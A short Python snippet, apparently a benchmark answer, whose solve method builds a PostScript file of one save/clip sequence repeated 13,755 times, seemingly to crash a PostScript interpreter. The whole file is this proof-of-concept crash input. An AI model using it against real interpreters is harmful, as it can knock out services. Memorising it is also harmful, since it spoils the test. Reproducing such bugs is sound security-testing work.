class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b'%!PS-Adobe-3.0\n'
        unit = b'save newpath 0 0 moveto 1 0 lineto 0 1 lineto closepath clip'
        num = 13755
        poc = header + unit * num
        return poc
